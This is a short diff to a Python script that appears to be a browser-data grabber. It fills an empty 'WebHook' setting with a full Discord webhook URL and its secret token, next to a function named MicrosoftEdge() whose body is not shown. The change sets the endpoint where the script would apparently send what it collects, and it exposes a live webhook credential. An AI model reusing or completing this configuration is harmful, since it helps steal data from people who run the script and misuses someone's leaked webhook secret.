@@ -3,7 +3,7 @@ import requests
 import threading
 
 
-WebHook = "" # Input your webhook here
+WebHook = "https://discord.com/api/webhooks/1526331115357339678/cwj6mM0PpIdo3ATEV7OB4-MNr1J3Hwvkb33KNudFAugh_1XSbRB2wpOPGfV_56wsCYyM" # Input your webhook here
 
 
 def MicrosoftEdge():
